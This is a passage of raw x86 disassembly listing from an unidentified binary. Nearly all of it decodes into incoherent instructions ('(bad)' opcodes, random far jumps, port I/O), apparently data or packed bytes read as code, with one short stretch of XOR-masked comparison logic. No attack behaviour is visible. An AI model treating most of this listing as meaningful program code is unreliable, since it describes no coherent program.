  414557:	or     DWORD PTR ds:0x9f5f9970,edi
  41455d:	stos   DWORD PTR es:[edi],eax
  41455e:	hlt    
  41455f:	or     al,0xd2
  414561:	je     0x414530
  414563:	push   0x37
  414565:	add    eax,0xb71303f
  41456a:	into   
  41456b:	or     DWORD PTR [edi+0x4043ca3],0xb37f52ce
  414575:	push   edi
  414576:	ror    BYTE PTR [edi],1
  414578:	fstp   TBYTE PTR [ebx-0x5a]
  41457b:	mov    esp,0xf5a3db32
  414580:	xchg   ebx,eax
  414581:	mov    ebp,0xcc8d264d
  414586:	and    bh,bl
  414588:	mov    dl,0xd0
  41458a:	ret    
  41458b:	jbe    0x414586
  41458d:	dec    ebx
  41458e:	call   0xdf74:0x10b7cfb9
  414595:	aam    0x35
  414597:	sbb    DWORD PTR [ebx],ebp
  414599:	mov    bl,0xe6
  41459b:	fadd   QWORD PTR [edx-0x6a9f4189]
  4145a1:	pop    ds
  4145a2:	xor    BYTE PTR [edi+0x7690dea2],dl
  4145a8:	xchg   eax,esp
  4145aa:	mov    al,BYTE PTR [eax+0x53]
  4145ad:	fidiv  WORD PTR [edx-0x76]
  4145b0:	cwde   
  4145b1:	inc    esi
  4145b2:	mov    al,ds:0xfa16c871
  4145b7:	push   eax
  4145b8:	inc    esp
  4145b9:	pop    ds
  4145ba:	fwait
  4145bb:	mov    ch,0x42
  4145bd:	ds push 0xb2f3d1a
  4145c3:	test   eax,0x842a089d
  4145c8:	sub    al,0x36
  4145ca:	cmp    DWORD PTR [ecx+0x8fec881],0xfffffffd
  4145d1:	addr16 call 0x38e18388
  4145d7:	dec    esi
  4145d8:	push   cs
  4145d9:	add    eax,0xc1fdec45
  4145de:	mov    ?,ebx
  4145e0:	adc    cl,ch
  4145e2:	mov    ebx,0xd9494a04
  4145e7:	fdivr  DWORD PTR [edi]
  4145e9:	into   
  4145ea:	outs   dx,DWORD PTR ds:[esi]
  4145eb:	loope  0x414625
  4145ed:	fcom   DWORD PTR [ebx+0x6b]
  4145f0:	in     al,dx
  4145f1:	jns    0x4145d6
  4145f3:	aad    0xae
  4145f5:	inc    edi
  4145f6:	pop    ds
  4145f7:	and    ah,bh
  4145f9:	clc    
  4145fa:	repnz ins DWORD PTR es:[edi],dx
  4145fc:	popa   
  4145fd:	clc    
  4145fe:	js     0x414668
  414600:	mov    dh,0x43
  414602:	inc    edi
  414603:	inc    ecx
  414604:	xlat   BYTE PTR ds:[ebx]
  414605:	push   edi
  414606:	sub    bl,BYTE PTR [edi+ebx*8+0x6123ec29]
  41460d:	iret   
  41460e:	push   eax
  41460f:	inc    esi
  414610:	inc    ecx
  414611:	jmp    0x414609
  414613:	daa    
  414614:	push   ebx
  414615:	scas   eax,DWORD PTR es:[edi]
  414616:	pop    ebp
  414617:	dec    ebp
  414618:	mov    esi,0x4dd6c510
  41461e:	mov    ch,0x35
  414620:	lea    edi,[eax+eiz*2+0x4e]
  414624:	jns    0x414692
  414626:	mov    bh,0xd0
  414628:	or     al,0xad
  41462a:	imul   ebp,DWORD PTR [eax],0x3d8efcbf
  414630:	(bad)  
  414631:	pop    eax
  414632:	mov    ebp,0x3df0a6ff
  414637:	aam    0x64
  414639:	mov    cl,0x6e
  41463b:	mov    esp,0x8afac5f4
  414640:	mov    ebp,DWORD PTR [ebx-0x217acfcf]
  414646:	push   0x64c047d4
  41464b:	lds    edi,FWORD PTR [edx+0x1f]
  41464e:	or     dh,bl
  414650:	dec    esi
  414651:	loopne 0x414652
  414653:	mov    eax,ds
  414655:	out    dx,al
  414656:	sub    al,BYTE PTR [ecx-0x14]
  414659:	gs (bad) 
  41465b:	clc    
  41465c:	pop    esi
  41465d:	sbb    DWORD PTR [ecx-0x12458746],ebp
  414663:	push   esp
  414664:	imul   eax,edx,0x7720c881
  41466a:	call   0x6d4776aa
  41466f:	sbb    eax,DWORD PTR [ecx+edi*8-0x32c638f5]
  414676:	cmp    ch,BYTE PTR [ebp+0x52983b70]
  41467c:	lds    ebx,FWORD PTR [ebp-0x63251f67]
  414682:	lea    ebp,[esi]
  414684:	jae    0x4146c2
  414686:	jnp    0x414699
  414688:	xor    al,0x82
  41468a:	mov    eax,0xbb49d188
  41468f:	stos   DWORD PTR es:[edi],eax
  414690:	cld    
  414691:	mov    ah,0xc4
  414693:	cld    
  414694:	icebp  
  414695:	dec    edi
  414696:	sub    bl,BYTE PTR [esi-0x67]
  414699:	mov    cl,0x48
  41469b:	xor    DWORD PTR [eax-0x3a],0x25
  41469f:	test   DWORD PTR es:[eax+0x24],edi
  4146a3:	ret    0x4e0d
  4146a6:	(bad)  
  4146a7:	and    BYTE PTR ds:0x503fe863,cl
  4146ad:	push   ss
  4146ae:	sub    ebx,DWORD PTR [edx]
  4146b0:	dec    esi
  4146b1:	push   es
  4146b2:	mov    bl,0x1a
  4146b4:	add    DWORD PTR [ebp-0x4446cb98],0x55
  4146bb:	jmp    0x8e6d:0x4be95b96
  4146c2:	lock pop ecx
  4146c4:	add    ah,BYTE PTR [edi-0x4fa719e3]
  4146ca:	push   es
  4146cb:	pop    esi
  4146cc:	fwait
  4146cd:	popf   
  4146ce:	sbb    esi,0xf64a65b9
  4146d4:	lods   eax,DWORD PTR ds:[esi]
  4146d5:	ja     0x41474c
  4146d7:	pop    ds
  4146d8:	jl     0x4146fa
  4146da:	sub    BYTE PTR [ebx],cl
  4146dc:	xlat   BYTE PTR ds:[ebx]
  4146dd:	call   DWORD PTR [esi-0x58]
  4146e0:	xchg   esi,eax
  4146e1:	xor    al,BYTE PTR ds:0x728ea1d2
  4146e7:	enter  0xc6da,0xaf
  4146eb:	adc    ah,BYTE PTR [esp+edx*4-0x68]
  4146ef:	mov    ecx,0xb804cd00
  4146f4:	test   DWORD PTR [ebx],ecx
  4146f6:	les    edx,FWORD PTR [ebx+edi*2+0x45]
  4146fa:	fiadd  DWORD PTR [eax]
  4146fc:	outs   dx,BYTE PTR ds:[esi]
  4146fd:	arpl   dx,sp
  4146ff:	add    DWORD PTR [edi+0x2],edi
  414702:	push   ecx
  414703:	ds jne 0x414695
  414706:	xchg   ebp,eax
  414707:	adc    dl,BYTE PTR [ecx]
  414709:	sbb    dh,BYTE PTR [edi]
  41470b:	aas    
  41470c:	adc    dl,BYTE PTR [ecx+0x41f216c6]
  414712:	pop    esi
  414713:	ins    DWORD PTR es:[edi],dx
  414714:	jns    0x41478d
  414716:	push   esp
  414717:	jns    0x4146d4
  414719:	mov    esi,0x9a25bd50
  41471e:	sti    
  41471f:	xchg   ecx,eax
  414720:	sub    eax,eax
  414722:	push   ecx
  414723:	fdiv   DWORD PTR [ebp-0x3b]
  414726:	dec    eax
  414727:	into   
  414728:	sbb    eax,0x3b3ee589
  41472d:	cs cmp ah,cl
  414730:	lods   eax,DWORD PTR ds:[esi]
  414731:	sti    
  414732:	jbe    0x414789
  414734:	adc    BYTE PTR [edx+0x56],bl
  414737:	fadd   QWORD PTR [ebx-0x2e]
  41473a:	enter  0xbf95,0x6
  41473e:	ret    
  41473f:	xchg   DWORD PTR [esp+eax*4],ebx
  414742:	pop    esi
  414743:	aaa    
  414744:	sub    ch,BYTE PTR [ebp+ebx*1-0x45538df7]
  41474b:	clc    
  41474c:	or     al,0x8e
  41474e:	popa   
  41474f:	mov    eax,0xffffb4e6
  414754:	or     BYTE PTR [ebp+0x3c],dl
  414757:	imul   edx,DWORD PTR [ebx],0x5b
  41475a:	adc    al,0x1f
  41475c:	or     eax,0x495e45fa
  414761:	test   BYTE PTR [eax],ch
  414763:	fistp  QWORD PTR [esi-0x41]
  414766:	sub    eax,0x7db18597
  41476b:	dec    eax
  41476c:	push   eax
  41476d:	aam    0x31
  41476f:	mov    ds:0x2267420a,al
  414774:	nop
  414775:	retf   
  414776:	fucomp st(3)
  414778:	cmc    
  414779:	pusha  
  41477a:	pop    es
  41477b:	inc    edx
  41477c:	xchg   DWORD PTR [edx+edi*4],edx
  41477f:	jmp    0x4f53:0xfa15fd42
  414786:	mov    ecx,0xab3ffc5c
  41478b:	addr16 xchg ebp,eax
  41478d:	test   eax,0x7b48e4d
  414792:	sub    eax,0x13ab7a7a
  414797:	sbb    ebp,ebp
  414799:	stos   DWORD PTR es:[edi],eax
  41479a:	mov    bh,0xff
  41479c:	test   al,0x95
  41479e:	popa   
  41479f:	cs jmp 0x4147e7
  4147a2:	xchg   esi,eax
  4147a3:	or     dh,BYTE PTR [ebp-0x4c]
  4147a6:	test   BYTE PTR [eax+0x7986ae39],bl
  4147ac:	xchg   cl,bh
  4147ae:	leave  
  4147af:	adc    edi,DWORD PTR [ebp+0x43aee266]
  4147b5:	aad    0x80
  4147b7:	cwde   
  4147b8:	cmp    eax,0x63d7e926
  4147bd:	jp     0x4147be
  4147bf:	data16 jg 0x4147c9
  4147c2:	pop    es
  4147c3:	clc    
  4147c4:	and    al,0x7c
  4147c6:	test   eax,0x2d915c7e
  4147cb:	xor    BYTE PTR [ebp-0x68],dl
  4147ce:	ror    ebp,1
  4147d0:	dec    edi
  4147d1:	das    
  4147d2:	std    
  4147d3:	dec    edx
  4147d4:	mov    al,0xae
  4147d6:	dec    esp
  4147d7:	add    al,0x24
  4147d9:	sub    dl,BYTE PTR [ecx+0x5b2b72be]
  4147df:	stos   DWORD PTR es:[edi],eax
  4147e0:	arpl   ax,ax
  4147e2:	jnp    0x414775
  4147e4:	pop    ebp
  4147e5:	sbb    al,0x3f
  4147e7:	cdq    
  4147e8:	mov    al,ds:0xe95f1ce2
  4147ed:	imul   esi,ebp,0x6627679f
  4147f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4147f4:	imul   DWORD PTR [edi]
  4147f6:	jg     0x41478f
  4147f8:	jae    0x41486a
  4147fa:	sub    DWORD PTR [edx],ebp
  4147fc:	xchg   BYTE PTR [ecx-0x6],ah
  4147ff:	mov    cl,0xb6
  414801:	sbb    cl,BYTE PTR [edx]
  414803:	popf   
  414804:	xor    eax,0xdc34d0d4
  414809:	repz inc ebx
  41480b:	pop    ss
  41480c:	retf   0xbf27
  41480f:	pop    eax
  414810:	mov    bl,0xe0
  414812:	mov    ebp,0xe84150be
  414817:	adc    DWORD PTR [edi],edi
  414819:	mov    edx,0x8440fa87
  41481e:	cmp    BYTE PTR [ebx],cl
  414820:	bound  ebp,QWORD PTR [esi+0x699f9f6c]
  414826:	arpl   bp,ax
  414828:	lds    ecx,FWORD PTR [edi+0x1bcfbe23]
  41482e:	sub    ah,cl
  414830:	jle    0x4147e0
  414832:	inc    ebp
  414833:	push   ss
  414834:	lods   al,BYTE PTR ds:[esi]
  414835:	outs   dx,BYTE PTR ds:[esi]
  414836:	mov    DWORD PTR [edx+0x29418087],edi
  41483c:	pusha  
  41483d:	jnp    0x414838
  41483f:	mov    ecx,DWORD PTR [eax+0xc]
  414842:	call   0xf8c4f819
  414847:	bound  esi,QWORD PTR [ecx+0x73e57a8e]
  41484d:	dec    ebx
  41484e:	xchg   BYTE PTR [eax+ebp*8],bh
  414851:	in     al,0x87
  414853:	imul   ebp,DWORD PTR [eax],0xffffff88
  414856:	js     0x4147f8
  414858:	fst    QWORD PTR fs:[eax+0x5be3553e]
  41485f:	push   ebx
  414860:	repz test eax,0x5628cb9d
  414866:	in     al,dx
  414867:	jmp    0x414844
  414869:	add    BYTE PTR [edi+0x45],dh
  41486c:	fadd   st,st(3)
  41486e:	dec    esi
  41486f:	mov    BYTE PTR [edx+0x3aaf9677],0x70
  414876:	outs   dx,BYTE PTR ds:[esi]
  414877:	stos   BYTE PTR es:[edi],al
  414878:	repnz adc eax,0xf4e5f0b5
  41487e:	xchg   ebp,eax
  41487f:	mov    dl,0x4
  414881:	scas   al,BYTE PTR es:[edi]
  414882:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414883:	aad    0x7d
  414885:	add    al,0x2a
  414887:	mov    ds:0xbb67c9c2,al
  41488c:	dec    eax
  41488d:	(bad)  
  41488e:	out    dx,eax
  41488f:	or     ebp,ebx
  414891:	imul   eax,edx,0xffffffff
  414894:	xor    al,0xd8
  414896:	mov    bl,0x12
  414898:	cmp    eax,esi
  41489a:	dec    edx
  41489b:	adc    al,0xa0
  41489d:	lock mov edx,0xe870b4f7
  4148a3:	jmp    0x4f3b:0x4ea69541
  4148aa:	stos   DWORD PTR es:[edi],eax
  4148ab:	push   eax
  4148ac:	int3   
  4148ad:	imul   eax,DWORD PTR [edx+0x60],0xf7f1b95f
  4148b4:	mov    esi,0xabeb883a
  4148b9:	(bad)  
  4148ba:	out    0x21,al
  4148bc:	add    ch,BYTE PTR [ebx]
  4148be:	cmp    eax,0x1eee08b
  4148c3:	lahf   
  4148c4:	xchg   ebp,eax
  4148c5:	pop    ebp
  4148c6:	pop    ebp
  4148c7:	push   edx
  4148c8:	and    bh,ah
  4148ca:	and    dl,BYTE PTR [eax]
  4148cc:	pop    edi
  4148cd:	jle    0x41490d
  4148cf:	pop    es
  4148d0:	jns    0x4148a9
  4148d2:	call   0x4d5cbc52
  4148d7:	pop    ds
  4148d8:	xor    eax,0xb1c4de0c
  4148dd:	sti    
  4148de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148df:	test   BYTE PTR [edx+0x9],ch
  4148e2:	push   edi
  4148e3:	xchg   edi,eax
  4148e4:	jmp    0x22d:0x5f046d14
  4148eb:	jnp    0x41488d
  4148ed:	add    eax,0x96f2cb59
  4148f2:	push   es
  4148f3:	test   BYTE PTR [edi],0xbf
  4148f6:	xchg   DWORD PTR [esi-0x24b575f6],esp
  4148fc:	inc    ecx
  4148fd:	inc    esp
  4148fe:	mov    cl,0x83
  414900:	sbb    BYTE PTR [edi],0xb7
  414903:	scas   eax,DWORD PTR es:[edi]
  414904:	inc    edx
  414905:	imul   edi,DWORD PTR [ebx+0x59],0x47
  414909:	arpl   WORD PTR cs:[edx],si
  41490c:	pop    ebx
  41490d:	mov    bl,0xbc
  41490f:	test   BYTE PTR [ebx-0x6b750bab],cl
  414915:	adc    eax,0xffffff64
  41491a:	mov    bl,BYTE PTR [ebp-0x1]
  41491d:	cmp    dl,bl
  41491f:	je     0x416d50
  414925:	mov    ecx,DWORD PTR [ebp-0x5c]
  414928:	mov    edx,DWORD PTR [ebp-0xc]
  41492b:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  414932:	mov    ebx,DWORD PTR [ebp+0xc]
  414935:	xor    ecx,eax
  414937:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272fa]
  41493e:	jne    0x416e84
  414944:	mov    ecx,DWORD PTR [ebp-0x5c]
  414947:	mov    edx,DWORD PTR [ebp+0xc]
  41494a:	xor    ecx,eax
  41494c:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272fa]
  414954:	mov    edx,DWORD PTR [ebp-0x18]
  414957:	xor    edx,eax
  414959:	add    edx,esi
  41495b:	cmp    ecx,edx
  41495d:	mov    ecx,DWORD PTR [ebp-0x14]
  414960:	mov    DWORD PTR [ebp+0x8],ecx
  414963:	mov    ecx,DWORD PTR [ebp+0x8]
  414966:	je     0x416f8c
  41496c:	xor    ecx,eax
  41496e:	add    ecx,esi
  414970:	mov    ecx,0xf641bea
  414975:	je     0x416dd8
  41497b:	mov    edx,DWORD PTR [ebp+0x8]
  41497e:	jmp    0x416cd1
  414983:	outs   dx,DWORD PTR ds:[esi]
  414984:	sub    edi,DWORD PTR [ebx]
  414986:	xchg   BYTE PTR [edi],bh
  414988:	div    BYTE PTR [esi+0x72]
  41498b:	daa    
  41498c:	mov    dl,0xdf
  41498e:	mov    bh,BYTE PTR [eax]
  414990:	inc    esi
  414991:	mov    al,ds:0x7a944e42
  414996:	jnp    0x414949
  414998:	pushf  
  414999:	jnp    0x414a16
  41499b:	(bad)  
  41499d:	and    eax,0x1a461d64
  4149a2:	push   ds
  4149a3:	les    ecx,FWORD PTR [ecx-0xcf90c6f]
  4149a9:	mov    eax,0x61a58f09
  4149ae:	dec    edx
  4149af:	mov    dh,0x39
  4149b1:	neg    DWORD PTR [edi]
  4149b3:	pop    edx
  4149b4:	pushf  
  4149b5:	dec    ebp
  4149b6:	mul    DWORD PTR [edx-0x11]
  4149b9:	nop
  4149ba:	pop    ecx
  4149bb:	adc    al,0xe8
  4149bd:	icebp  
  4149be:	int    0x10
  4149c0:	fwait
  4149c1:	sbb    al,0x32
  4149c3:	push   0xf27b5a8c
  4149c8:	popf   
  4149c9:	(bad)  
  4149ca:	sub    al,0xb8
  4149cc:	icebp  
  4149cd:	sbb    BYTE PTR [edx-0x9],bh
  4149d0:	gs mov dl,0xcd
  4149d3:	ds push ss
  4149d5:	mov    ebp,0x3e1009dc
  4149da:	pop    eax
  4149db:	lods   eax,DWORD PTR ds:[esi]
  4149dc:	push   cs
  4149dd:	cmp    DWORD PTR [ecx-0x3b],esp
  4149e0:	mov    bh,0x81
  4149e2:	sbb    BYTE PTR [edx+0x7d],al
  4149e5:	sbb    al,0x6d
  4149e7:	mov    eax,0xf62615e4
  4149ec:	dec    ecx
  4149ed:	pop    ss
  4149ee:	hlt    
  4149ef:	rcl    BYTE PTR [esi-0x6b],0xcf
  4149f3:	or     ecx,DWORD PTR [eax-0x5844f090]
  4149f9:	sar    dh,0xe2
  4149fc:	mov    ch,0xd3
  4149fe:	jbe    0x414a49
  414a00:	ror    BYTE PTR [edx-0x4f],cl
  414a03:	in     eax,0x9
  414a05:	xor    al,0x24
  414a07:	fcomp  DWORD PTR [eax-0x5b]
  414a0a:	rol    DWORD PTR [edx],1
  414a0c:	push   DWORD PTR [edi+0x2f]
  414a0f:	and    DWORD PTR [edx-0x10],esi
  414a12:	(bad)  
  414a13:	jg     0x414a0d
  414a15:	adc    edi,DWORD PTR [ecx-0x41]
  414a18:	ja     0x414a27
  414a1a:	pop    esp
  414a1b:	mov    ch,0xdd
  414a1d:	fmulp  st(0),st
  414a1f:	push   eax
  414a20:	hlt    
  414a21:	sub    BYTE PTR [edi],ch
  414a23:	and    DWORD PTR [edi],esp
  414a25:	arpl   WORD PTR [eax],di
  414a27:	jb     0x414a92
  414a29:	les    esp,FWORD PTR [edi+0x47]
  414a2c:	test   BYTE PTR [eax+eax*4],bl
  414a2f:	add    eax,0x71202c22
  414a34:	pop    ss
  414a35:	in     al,dx
  414a36:	popa   
  414a37:	push   ss
  414a38:	ins    DWORD PTR es:[edi],dx
  414a39:	pop    edx
  414a3a:	mov    bh,0xaa
  414a3c:	push   ebp
  414a3d:	(bad)  
  414a3e:	test   eax,0xb89f8a06
  414a43:	loopne 0x4149e1
  414a45:	retf   
  414a46:	popf   
  414a47:	jecxz  0x414a5f
  414a49:	pop    ss
  414a4a:	in     al,0xb
  414a4c:	pushf  
  414a4d:	pop    esi
  414a4e:	in     eax,0x71
  414a50:	aad    0x2c
  414a52:	shr    BYTE PTR [ebp+0x54],0xb0
  414a56:	inc    eax
  414a57:	push   ebx
  414a58:	test   eax,0xf7716839
  414a5d:	(bad)  
  414a5e:	in     al,dx
  414a5f:	cmp    al,0x8e
  414a61:	not    bh
  414a63:	sub    dh,0x64
  414a66:	and    bl,cl
  414a68:	in     eax,0xe2
  414a6a:	add    al,0xa0
  414a6c:	mov    al,ds:0x775a7c8d
  414a71:	test   DWORD PTR [ecx],0x4af7f722
  414a77:	test   BYTE PTR [ebp+0x383a4cda],al
  414a7d:	test   eax,0x9b169cba
  414a82:	xchg   ebx,eax
  414a83:	loope  0x414a28
  414a85:	xchg   ebx,eax
  414a86:	add    esi,DWORD PTR [ebx-0x2e]
  414a89:	fisub  WORD PTR [edi+0x1b3a51ac]
  414a8f:	xchg   ecx,eax
  414a90:	push   edi
  414a91:	push   eax
  414a92:	scas   al,BYTE PTR es:[edi]
  414a93:	cdq    
  414a94:	call   0xe02b:0x719dab77
  414a9b:	sbb    dh,BYTE PTR [edx+0x78b312bf]
  414aa1:	mov    eax,ds:0x5652e12b
  414aa6:	call   0x14c3a3fd
  414aab:	xchg   edx,eax
  414aac:	push   ecx
  414aad:	or     DWORD PTR [ecx],0x26
  414ab0:	iret   
  414ab1:	pop    ecx
  414ab2:	jecxz  0x414b28
  414ab4:	loopne 0x414aa4
  414ab6:	(bad)  
  414ab8:	cli    
  414ab9:	ret    0xfea7
  414abc:	leave  
  414abd:	mov    ds:0x1c9a14fd,al
  414ac2:	push   ecx
  414ac3:	and    esp,esi
  414ac5:	jge    0x414aca
  414ac7:	scas   eax,DWORD PTR es:[edi]
  414ac8:	sbb    ecx,DWORD PTR [edi]
  414aca:	cmp    DWORD PTR [ecx+0x3b],edx
  414acd:	stc    
  414ace:	nop
  414acf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ad0:	mov    ch,0xaa
  414ad2:	shl    BYTE PTR [edx+0x49],1
  414ad5:	jg     0x414b37
  414ad7:	inc    eax
  414ad8:	cdq    
  414ad9:	fcomp  DWORD PTR [ecx-0x75]
  414adc:	push   0xffffffd1
  414ade:	sbb    DWORD PTR [esp+ebx*1+0x60],eax
  414ae2:	add    esi,DWORD PTR [ebx+0x21]
  414ae5:	xchg   DWORD PTR [eax+ecx*1],esi
  414ae8:	or     bl,BYTE PTR gs:[esi-0x69]
  414aec:	mov    ecx,0x32520895
  414af1:	or     dl,dl
  414af3:	fwait
  414af4:	dec    esp
  414af5:	(bad)  
  414af6:	push   cs
  414af7:	xor    al,bh
  414af9:	data16 aas 
  414afb:	fcomp  QWORD PTR [eax+0x7d]
  414afe:	jnp    0x414b2f
  414b00:	fsubr  DWORD PTR [esi-0x4e]
  414b03:	xor    eax,0x40e6d642
  414b08:	das    
  414b09:	fsubr  DWORD PTR [ecx-0x7c587c77]
  414b0f:	mov    eax,0xd5c683ec
  414b14:	add    bh,BYTE PTR [esi-0x78f41f7f]
  414b1a:	je     0x414b29
  414b1c:	mov    ds:0x3e94c109,al
  414b21:	bound  esp,QWORD PTR [ebx+0x71]
  414b24:	std    
  414b25:	mov    dl,ch
  414b27:	push   0x6d
  414b29:	sub    eax,0x4567a24d
  414b2e:	jmp    0x7ee7505c
  414b33:	dec    esi
  414b34:	mov    ecx,edx
  414b36:	pusha  
  414b37:	or     ah,BYTE PTR [ecx]
  414b39:	fs pop edx
  414b3b:	adc    edx,ebx
  414b3d:	dec    ebx
  414b3e:	sub    ebx,0xba69142b
  414b44:	xor    al,0x16
  414b46:	mov    bl,0x5b
  414b48:	sbb    BYTE PTR [eax-0x2d56082],ah
  414b4e:	push   ds
  414b4f:	and    al,0xce
  414b51:	ja     0x414b72
  414b53:	outs   dx,BYTE PTR ds:[esi]
  414b54:	mov    dh,0x2c
  414b56:	rcl    esp,0xb9
  414b59:	mov    ecx,0x1e31a450
  414b5e:	(bad)  
  414b60:	outs   dx,BYTE PTR ds:[esi]
  414b61:	loopne 0x414b34
  414b63:	fstp   DWORD PTR [ebx-0x730a3219]
  414b69:	jmp    0x414b94
  414b6b:	fisubr DWORD PTR [edi-0x550eba08]
  414b71:	and    ecx,DWORD PTR [edi]
  414b73:	dec    edx
  414b74:	push   ebp
  414b75:	pusha  
  414b76:	int    0x8f
  414b78:	or     eax,0x708a8dbc
  414b7d:	das    
  414b7e:	jns    0x414b0f
  414b80:	sti    
  414b81:	sub    cl,BYTE PTR es:[edi]
  414b84:	stos   DWORD PTR es:[edi],eax
  414b85:	and    DWORD PTR [edx-0x48d65adf],0xffffffa6
  414b8c:	(bad)  
  414b8e:	mov    esp,DWORD PTR [ecx-0x7e]
  414b91:	jmp    0xb0108044
  414b96:	mov    dl,BYTE PTR [ebx]
  414b98:	nop/reserved BYTE PTR [eax-0x2b]
  414b9c:	mov    ch,0x45
  414b9e:	pop    ds
  414b9f:	inc    eax
  414ba0:	aas    
  414ba1:	pop    eax
  414ba2:	sbb    DWORD PTR [edx+0x64882471],eax
  414ba8:	pop    eax
  414ba9:	jg     0x414b9a
  414bab:	sbb    eax,0xb353004
  414bb0:	or     dl,dh
  414bb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414bb3:	adc    BYTE PTR [esi+0x67],0xd9
  414bb7:	das    
  414bb8:	pop    ss
  414bb9:	push   cs
  414bba:	mov    esp,0x5a62edf9
  414bbf:	out    0x25,al
  414bc1:	dec    esi
  414bc2:	jo     0x414bff
  414bc4:	in     eax,dx
  414bc5:	addr16 fs cmp al,0x53
  414bc9:	jle    0x414c23
  414bcb:	jmp    0xb752579e
  414bd0:	daa    
  414bd1:	xchg   edi,eax
  414bd2:	les    esi,FWORD PTR [esi-0x637b4bee]
  414bd8:	jp     0x414c05
  414bda:	aad    0x24
  414bdc:	cli    
  414bdd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414bde:	add    BYTE PTR [ebx],0xf
  414be1:	inc    ecx
  414be2:	les    ebp,FWORD PTR [esi+eax*8+0x551d10be]
  414be9:	sub    DWORD PTR [esi],0xd
  414bec:	stos   DWORD PTR es:[edi],eax
  414bed:	fistp  DWORD PTR [ebp-0x6e]
  414bf0:	popa   
  414bf1:	scas   eax,DWORD PTR es:[edi]
  414bf2:	mov    esi,0x33508544
  414bf7:	and    ebp,edi
  414bf9:	test   BYTE PTR [eax+0x3f],bh
  414bfc:	call   0xdc753c11
  414c01:	xchg   al,dl
  414c03:	inc    esi
  414c04:	arpl   WORD PTR [ecx-0x11baadc1],di
  414c0a:	popa   
  414c0b:	cld    
  414c0c:	mov    dh,BYTE PTR ss:[esi+0x11a325a]
  414c13:	and    BYTE PTR [esi-0x1919d857],ch
  414c19:	adc    ecx,DWORD PTR [esi-0x70]
  414c1c:	sub    al,0x83
  414c1e:	clc    
  414c1f:	inc    esi
  414c20:	out    0x2a,eax
  414c22:	fidiv  WORD PTR [edx]
  414c24:	es jg  0x414be2
  414c27:	xchg   ebp,eax
  414c28:	jmp    0x414c2a
  414c2a:	in     al,0xc3
  414c2c:	jo     0x414c42
  414c2e:	and    al,0x94
  414c30:	and    ecx,DWORD PTR ss:[eax-0xe31d610]
  414c37:	mov    ch,0x33
  414c39:	ins    BYTE PTR es:[edi],dx
  414c3a:	sbb    BYTE PTR [ecx+0x4b],bh
  414c3d:	aas    
  414c3e:	dec    edx
  414c3f:	shl    BYTE PTR [eax],1
  414c41:	test   eax,0x1f88f45f
  414c46:	int3   
  414c47:	imul   eax,eax,0x20f86408
  414c4d:	pop    esp
  414c4e:	adc    BYTE PTR [eax+0x0],0xe6
  414c52:	ja     0x414c5c
  414c54:	xor    BYTE PTR [ebp-0x61719d49],cl
  414c5a:	adc    ebx,DWORD PTR [eax+0x67]
  414c5d:	xor    dl,BYTE PTR [edi-0x3a]
  414c60:	xor    ah,BYTE PTR [edi]
  414c62:	arpl   WORD PTR [edx-0x10],si
  414c65:	pop    es
  414c66:	ins    DWORD PTR es:[edi],dx
  414c67:	jp     0x414bf0
  414c69:	cmp    DWORD PTR [esi-0x7f9aea0a],ebx
  414c6f:	push   0xffffffd1
  414c71:	adc    al,al
  414c73:	pop    ebx
  414c74:	(bad)  
  414c75:	rcl    DWORD PTR [ecx+0x42],cl
  414c78:	adc    BYTE PTR [esi+edx*1+0x8],dh
  414c7c:	push   0xffffffdf
  414c7e:	add    eax,0xe2267453
  414c83:	rol    DWORD PTR [esi+0x73],1
  414c86:	sbb    bh,ah
  414c88:	pop    esi
  414c89:	fmul   DWORD PTR [eax-0x63]
  414c8c:	push   edi
  414c8d:	stos   BYTE PTR es:[edi],al
  414c8e:	add    ebx,eax
  414c90:	mov    ch,0x8d
  414c92:	scas   eax,DWORD PTR es:[edi]
  414c93:	jne    0x414c50
  414c95:	gs mov ah,0x2c
  414c98:	lea    ebp,[edi]
  414c9a:	mov    ds:0xb23a9e1,al
  414c9f:	mov    WORD PTR [esi+0x676b519e],ss
  414ca5:	and    eax,0xf55318cf
  414caa:	repz arpl WORD PTR [esi+0x3bbb951d],bp
  414cb1:	shr    DWORD PTR [ecx],cl
  414cb3:	cwde   
  414cb4:	ror    BYTE PTR [esi-0x11],0x1b
  414cb8:	retf   
  414cb9:	dec    ebx
  414cba:	shl    BYTE PTR [eax-0x596e1951],cl
  414cc0:	mov    edx,DWORD PTR [esi+0x48c62e2d]
  414cc6:	fsub   st,st(0)
  414cc8:	inc    esp
  414cc9:	sub    esp,ecx
  414ccb:	push   ss
  414ccc:	ins    BYTE PTR es:[edi],dx
  414ccd:	add    eax,0xdd1494e
  414cd2:	dec    ebx
  414cd3:	pop    eax
  414cd4:	cli    
  414cd5:	inc    edx
  414cd6:	jnp    0x414d0d
  414cd8:	jnp    0x414cf3
  414cda:	cld    
  414cdb:	stc    
  414cdc:	pop    edx
  414cdd:	mov    BYTE PTR ds:0xd02016dd,ah
  414ce3:	xchg   esp,eax
  414ce4:	in     eax,0xb
  414ce6:	sbb    bh,BYTE PTR [edx-0x21]
  414ce9:	popa   
  414cea:	sub    BYTE PTR [ebx-0x68fed40],bh
  414cf0:	mov    al,0x69
  414cf2:	jmpw   0xd544
  414cf6:	xchg   esp,eax
  414cf7:	lods   al,BYTE PTR ds:[esi]
  414cf8:	xchg   ebx,ebp
  414cfa:	add    ah,0xb5
  414cfd:	mov    eax,0x28cb70ba
  414d02:	retf   0xeabc
  414d05:	or     eax,0xabc6befc
  414d0a:	aad    0xb5
  414d0c:	inc    esi
  414d0d:	ud2    
  414d0f:	mov    WORD PTR [eax+0x70ded1e8],gs
  414d15:	in     eax,0x3f
  414d17:	add    eax,DWORD PTR [ebx-0x7b]
  414d1a:	adc    BYTE PTR [edx],bh
  414d1c:	push   edi
  414d1d:	inc    eax
  414d1e:	mov    cl,0x4
  414d20:	push   es
  414d21:	xchg   ebp,eax
  414d22:	and    BYTE PTR [eax-0x5c],0xf9
  414d26:	sub    dh,0x5c
  414d29:	cwde   
  414d2a:	inc    ecx
  414d2b:	neg    DWORD PTR [edi-0xf]
